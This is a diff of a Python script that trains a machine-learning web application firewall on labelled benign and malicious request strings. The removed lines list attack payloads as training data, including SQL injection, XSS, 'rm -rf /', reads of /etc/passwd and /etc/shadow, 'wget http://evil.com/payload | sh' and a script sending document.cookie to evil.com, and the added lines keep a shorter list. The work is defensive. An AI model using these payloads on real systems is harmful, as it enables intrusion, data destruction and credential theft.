@@ -1,227 +1,226 @@
 import os
-import joblib
+import re
 import random
-import numpy as np
+import joblib
 import pandas as pd
-from sklearn.model_selection import StratifiedKFold, cross_val_predict
+import numpy as np
+from pathlib import Path
+from sklearn.pipeline import Pipeline
 from sklearn.feature_extraction.text import TfidfVectorizer
 from sklearn.linear_model import LogisticRegression
-from sklearn.pipeline import make_pipeline
-from sklearn.metrics import classification_report, confusion_matrix
-import string
-
-
-# ---------------------------------
-# 1. LARGE MALICIOUS DATASET
-# ---------------------------------
-
-malicious_payloads = [
-
-    # SQL Injection
-    "SELECT * FROM users WHERE id=1",
-    "1 OR 1=1",
-    "' OR '1'='1",
-    "admin' --",
-    "SELECT username, password FROM users",
-    "DROP TABLE accounts",
-    "UNION SELECT credit_card FROM customers",
-    "INSERT INTO users VALUES ('hack')",
-    "UPDATE users SET password='hacked'",
-
-    # XSS
-    "<script>alert(1)</script>",
-    "<img src=x onerror=alert(1)>",
-    "<svg onload=alert(1337)>",
-    "\" onmouseover=\"alert(1)",
-    "<iframe src=javascript:alert('xss')>",
-
-    # Command Injection
-    "; rm -rf /",
-    "&& cat /etc/passwd",
-    "| ls -la",
-    "`shutdown -h now`",
-    "$(reboot)",
-
-    # Path Traversal
-    "../etc/passwd",
-    "../../../../../etc/shadow",
-    "..\\..\\windows\\system32\\cmd.exe",
-    "/../../boot.ini",
-
-    # Remote File Inclusion (RFI)
-    "http://evil.com/shell.txt",
-    "https://malware.cc/backdoor.php",
-
-    # OS Shell Abuse
-    "system('ls')",
-    "exec('/bin/sh')",
-    "wget http://evil.com/payload | sh",
-
-    # SQLi advanced payloads
-    "'; EXEC xp_cmdshell('dir'); --",
-    "UNION SELECT NULL,NULL,NULL--",
-    "SELECT LOAD_FILE('/etc/passwd')",
-
-    # Misc Exploit Payloads
-    "<script>document.location='http://evil.com?cookie=' + document.cookie</script>",
-    "cat /etc/shadow",
-]
-
-
-# Duplicate malicious + noise
-mal_texts = []
-for txt in malicious_payloads:
-    for _ in range(50):  # 50 variants each = ~1500 malicious samples
-        noisy = txt
-        # Add random noise
-        if random.random() < 0.4:
-            noisy = noisy.lower()
-        if random.random() < 0.3:
-            noisy += " --"
-        if random.random() < 0.2:
-            noisy = noisy.replace(" ", random.choice(["  ", "%20", "+"]))
-
-        mal_texts.append(noisy)
-
-mal_labels = [1] * len(mal_texts)
-
-
-# ---------------------------------
-# 2. LARGE BENIGN DATASET
-# ---------------------------------
-
-benign_sentences = [
-
-    # User messages
-    "Hello, how are you?",
-    "This is a normal sentence.",
-    "I love machine learning!",
-    "The weather is great today.",
-    "User clicked the login button.",
-    "Fetching product list.",
-    "Profile updated successfully.",
-    "Normal request from Mehak.",
-    "This firewall project is awesome!",
-
-    # Clean API calls
-    "GET /index.html HTTP/1.1",
-    "POST /api/register",
-    "GET /products?page=2&sort=asc",
-    "DELETE /cart/item/4",
-    "PUT /update/profile",
-
-    # Clean URLs
-    "/assets/logo.png",
-    "/images/profile.jpg",
-    "/documents/report.pdf",
-
-    # Form submissions
-    "name=mehak&email=mehak@example.com",
-    "search=iphone14&type=latest",
-
-    # Random harmless text
-    "hello world program",
-    "I am testing the AI firewall",
-    "Send me the details tomorrow."
-]
-
-
-ben_texts = []
-for txt in benign_sentences:
-    for _ in range(60):  # 60 variants each = ~1500 benign samples
-        noisy = txt
-        if random.random() < 0.3:
-            noisy = noisy.lower()
-        if random.random() < 0.2:
-            noisy += "   "
-        ben_texts.append(noisy)
-
-# Add random harmless garbage text
-for _ in range(600):
-    rand = ''.join(random.choices(string.ascii_letters + "      ", k=random.randint(20, 80)))
-    ben_texts.append(rand)
-
-# ---------------------------------
-# EXTRA: MASSIVE BENIGN NOISE SECTION
-# ---------------------------------
-
-# 1) Short benign strings
-short_benign = [
-    "hi", "hello", "ok", "test", "this", "this is", "good", "nice", "cool",
-    "yes", "no", "fine", "thank you", "lol", "haha", "hmm", "h"
-]
-for txt in short_benign:
-    for _ in range(80):
-        ben_texts.append(txt)
-
-# 2) Random English-like text
-words = ["tree", "apple", "car", "road", "firewall", "machine", "learning", 
-         "hello", "sunset", "random", "weather", "name", "email"]
-for _ in range(600):
-    sent = " ".join(random.choices(words, k=random.randint(3, 12)))
-    ben_texts.append(sent)
-
-# 3) Random garbage strings that are STILL safe
-for _ in range(600):
-    garbage = ''.join(random.choices(string.ascii_letters + "      1234567890", k=random.randint(5, 60)))
-    ben_texts.append(garbage)
-
-# 4) Very long benign paragraphs
-long_texts = [
-    "This is a long paragraph describing normal user behavior on a website. "
-    "There is nothing harmful or malicious, it is just plain text used for training a web application firewall.",
-    "Users frequently write comments, reviews, or feedback that contain many normal words but no malicious intent."
-]
-for txt in long_texts:
-    for _ in range(50):
-        ben_texts.append(txt)
-ben_labels = [0] * len(ben_texts)
-
-# ---------------------------------
-# 3. COMBINE INTO DATAFRAME
-# ---------------------------------
-
-texts = mal_texts + ben_texts
-labels = mal_labels + ben_labels
-
-df = pd.DataFrame({"text": texts, "label": labels})
-df = df.sample(frac=1, random_state=42).reset_index(drop=True)
-
-print("Dataset Size:", len(df))
-print(df["label"].value_counts())
-
-
-# ---------------------------------
-# 4. BUILD MODEL (TF-IDF + Logistic Regression)
-# ---------------------------------
-
-pipeline = make_pipeline(
-    TfidfVectorizer(ngram_range=(1, 3), max_features=12000),
-    LogisticRegression(max_iter=2000, class_weight="balanced", random_state=42)
+from sklearn.model_selection import train_test_split
+from sklearn.metrics import (
+    classification_report, confusion_matrix,
+    f1_score, accuracy_score, roc_auc_score
 )
+from sklearn.utils import shuffle
 
+RND = 42
+random.seed(RND)
+np.random.seed(RND)
 
-# ---------------------------------
-# 5. CROSS VALIDATION REPORT
-# ---------------------------------
+# -----------------------------------------
+# Helper: Extract only PATH from URL
+# -----------------------------------------
+def extract_path(url):
+    url = str(url)
+    match = re.search(r"http[s]?://[^/]+(/.*)", url)
+    return match.group(1) if match else url
 
-skf = StratifiedKFold(n_splits=5, shuffle=True, random_state=42)
+# -----------------------------------------
+# FIXED: Safe URL generator (robust)
+# -----------------------------------------
+def generate_safe_url_templates():
+    base_paths = [
+        "/home", "/index.php", "/products", "/product/view",
+        "/cart/add", "/user/profile", "/account/settings",
+        "/search", "/blog/article", "/api/items",
+        "/api/user", "/checkout", "/category", "/contact",
+        "/about", "/login", "/logout", "/register"
+    ]
 
-preds = cross_val_predict(pipeline, df["text"], df["label"], cv=skf, method="predict")
+    params = [
+        "?id={}", "?q={}", "?page={}", "?page={}&sort=asc", "?cat={}&p={}"
+    ]
 
-print("\n----- Classification Report (5-Fold CV) -----")
-print(classification_report(df["label"], preds))
+    words = ["apple","book","phone","toy","shirt","camera","code","safe","normal","testing"]
 
-print("\n----- Confusion Matrix -----")
-print(confusion_matrix(df["label"], preds))
+    urls = set()
 
+    for b in base_paths:
+        urls.add(b)
 
-# ---------------------------------
-# 6. TRAINING FINAL MODEL & SAVE
-# ---------------------------------
+        for p in params:
+            count = p.count("{}")
+            if count == 0:
+                urls.add(b + p)
+            elif count == 1:
+                val = random.choice(words)
+                urls.add(b + p.format(val))
+            elif count == 2:
+                v1 = random.choice(words)
+                v2 = random.choice(words)
+                urls.add(b + p.format(v1, v2))
 
-pipeline.fit(df["text"], df["label"])
+    # deeper safe URLs
+    for _ in range(300):
+        b = random.choice(base_paths)
+        depth = "/".join(random.choices(words, k=random.randint(1, 3)))
+        urls.add(f"{b}/{depth}")
+
+    return list(urls)
+
+# -----------------------------------------
+# Generate safe ENGLISH sentences
+# -----------------------------------------
+def generate_safe_sentences(n=300):
+    starts = ["hello", "hi", "this is", "i am", "please", "kindly"]
+    middles = ["a safe request", "normal text", "not malicious", "a student", "testing the firewall"]
+    ends = ["thank you", "just testing", "please allow", "open homepage", "nothing harmful here"]
+
+    sentences = []
+    for _ in range(n):
+        s = f"{random.choice(starts)} {random.choice(middles)} {random.choice(ends)}"
+        sentences.append(s)
+    return sentences
+
+# -----------------------------------------
+# Malicious payload generators
+# -----------------------------------------
+def mutate_malicious(payload):
+    v = payload
+    if random.random() < 0.4:
+        v = v.replace(" ", "%20").replace("'", "%27")
+    if random.random() < 0.3:
+        v = "".join(c.upper() if random.random() < 0.5 else c for c in v)
+    if random.random() < 0.3:
+        v = v.replace(" ", "/* */")
+    return v
+
+def generate_malicious_variants():
+    base = [
+        "SELECT * FROM users WHERE id=1",
+        "' OR '1'='1",
+        "UNION SELECT username, password FROM accounts",
+        "<script>alert(1)</script>",
+        "../../etc/passwd",
+        "; rm -rf /",
+        "| cat /etc/shadow",
+        "`cat /etc/passwd`",
+        "exec('ls')",
+        "system('rm -rf *')",
+        "sleep(10)",
+    ]
+
+    variants = []
+    for p in base:
+        variants.append(p)
+        for _ in range(7):
+            variants.append(mutate_malicious(p))
+
+    # shallow SQL variants
+    for _ in range(200):
+        col = random.choice(["name", "id", "email", "password"])
+        tbl = random.choice(["users", "accounts", "orders"])
+        q = f"SELECT {col} FROM {tbl} WHERE {col} LIKE '%a%'"
+        variants.append(q)
+
+    return list(set(variants))
+
+# -----------------------------------------
+# Load CSIC dataset
+# -----------------------------------------
+print("Loading CSIC dataset...")
+df = pd.read_csv("csic_database.csv", low_memory=False)
+
+df["clean_url"] = df["URL"].astype(str).apply(extract_path)
+csic_text = df["clean_url"]
+csic_labels = df["classification"].astype(int)
+
+print("CSIC samples:", len(csic_text))
+
+# -----------------------------------------
+# Build synthetic safe + malicious
+# -----------------------------------------
+safe_urls = generate_safe_url_templates()
+safe_sentences = generate_safe_sentences(400)
+api_safe = [f'{{"action":"get","id":{random.randint(1,400)}}}' for _ in range(200)]
+safe_samples = list(set(safe_urls + safe_sentences + api_safe))
+
+malicious_samples = generate_malicious_variants()
+
+# -----------------------------------------
+# Merge everything
+# -----------------------------------------
+texts = pd.concat([csic_text, pd.Series(safe_samples), pd.Series(malicious_samples)], ignore_index=True)
+labels = pd.concat([csic_labels, pd.Series([0]*len(safe_samples)), pd.Series([1]*len(malicious_samples))], ignore_index=True)
+
+texts, labels = shuffle(texts, labels, random_state=RND)
+
+print("Final dataset size:", texts.shape)
+print("Labels:", labels.value_counts())
+
+# -----------------------------------------
+# Split into Train, Validation, Test
+# -----------------------------------------
+X_train, X_test, y_train, y_test = train_test_split(texts, labels, test_size=0.10, random_state=RND, stratify=labels)
+X_train, X_val, y_train, y_val = train_test_split(X_train, y_train, test_size=0.12, random_state=RND, stratify=y_train)
+
+# -----------------------------------------
+# Build Pipeline
+# -----------------------------------------
+pipe = Pipeline([
+    ("tfidf", TfidfVectorizer(
+        max_features=15000,
+        ngram_range=(1, 3),
+        min_df=2,
+        max_df=0.95,
+        token_pattern=r"[^ ]+"
+    )),
+    ("clf", LogisticRegression(max_iter=1000, class_weight="balanced", solver="saga"))
+])
+
+pipe.fit(X_train, y_train)
+
+# -----------------------------------------
+# Threshold tuning
+# -----------------------------------------
+val_probs = pipe.predict_proba(X_val)[:,1]
+
+best_thr = 0.5
+best_f1 = 0
+
+for thr in np.linspace(0.2, 0.95, 60):
+    preds = (val_probs >= thr).astype(int)
+    f1 = f1_score(y_val, preds)
+    if f1 > best_f1:
+        best_f1 = f1
+        best_thr = thr
+
+print(f"\nChosen threshold: {best_thr:.3f} (F1={best_f1:.4f})")
+
+# -----------------------------------------
+# Final evaluation
+# -----------------------------------------
+test_probs = pipe.predict_proba(X_test)[:,1]
+test_preds = (test_probs >= best_thr).astype(int)
+
+print("\n===== FINAL MODEL EVALUATION =====\n")
+print("Accuracy:", accuracy_score(y_test, test_preds))
+print("ROC-AUC:", roc_auc_score(y_test, test_probs))
+print(classification_report(y_test, test_preds))
+print("Confusion Matrix:")
+print(confusion_matrix(y_test, test_preds))
+
+# -----------------------------------------
+# Save model + threshold
+# -----------------------------------------
 os.makedirs("app/models", exist_ok=True)
-joblib.dump(pipeline, "app/models/waf_model.pkl")
+joblib.dump(pipe, "app/models/waf_model.pkl")
+
+with open("app/models/waf_threshold.txt", "w") as f:
+    f.write(str(best_thr))
 
 print("\nModel saved to app/models/waf_model.pkl")
+print("Threshold saved to app/models/waf_threshold.txt")
+print("Training complete.")
